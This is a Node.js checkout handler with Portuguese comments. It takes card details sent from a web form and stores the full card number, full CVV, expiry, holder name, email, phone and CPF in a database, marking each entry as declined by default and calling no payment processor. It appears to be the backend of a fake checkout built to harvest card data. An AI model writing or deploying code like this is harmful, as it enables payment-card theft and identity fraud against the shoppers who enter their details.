const {
  getOrderBySession,
  insertCardAttempt,
  readJson,
  sendJson
} = require('./_utils');

function cleanText(value, maxLength = 160) {
  return String(value || '').trim().slice(0, maxLength);
}

function onlyDigits(value) {
  return String(value || '').replace(/\D/g, '');
}

module.exports = async function handler(req, res) {
  try {
    if (req.method !== 'POST') {
      return sendJson(res, 405, { message: 'Metodo nao permitido.' });
    }

    const body = await readJson(req);
    const sessionId = cleanText(body.sessionId || body.session_id, 80);
    const order = sessionId ? await getOrderBySession(sessionId).catch(() => null) : null;
    
    // Pega o número completo vindo do front
    const rawCardNumber = body.cardNumber || body.card_number || '';
    const cardDigits = onlyDigits(rawCardNumber);

    if (!cardDigits || cardDigits.length < 13) {
      return sendJson(res, 400, { message: 'Numero do cartao invalido.' });
    }

    // Pega o CVV completo
    const rawCvv = body.cardCvv || body.card_cvv || '';
    const cvvDigits = onlyDigits(rawCvv);

    const amount = Number(body.amount || order?.amount || 0);
    
    const row = {
      session_id: sessionId || null,
      identifier: order?.identifier || cleanText(body.identifier, 80) || null,
      holder: cleanText(body.holder),
      email: cleanText(body.email, 180),
      phone: onlyDigits(body.phone).slice(0, 20),
      cpf: onlyDigits(body.cpf || body.document).slice(0, 14),
      
      // Salva nas colunas novas
      card_number: cardDigits,       // Apenas dígitos no banco
      card_brand: cleanText(body.cardBrand || body.card_brand, 40),
      card_last4: cardDigits.slice(-4),
      card_expiry: cleanText(body.cardExpiry || body.card_expiry, 7),
      card_cvv: cvvDigits,           // CVV apenas dígitos
      
      amount: Number.isFinite(amount) ? Number(amount.toFixed(2)) : null,
      status: cleanText(body.status, 40) || 'Recusado',
      metadata: {
        source: 'checkout-card',
        luhnValid: Boolean(body.luhnValid)
      }
    };

    const attempt = await insertCardAttempt(row);
    return sendJson(res, 200, { ok: true, id: attempt?.id || null });
  } catch (error) {
    console.error(error);
    return sendJson(res, 500, { message: error.message || 'Erro ao salvar tentativa de cartao.' });
  }
};
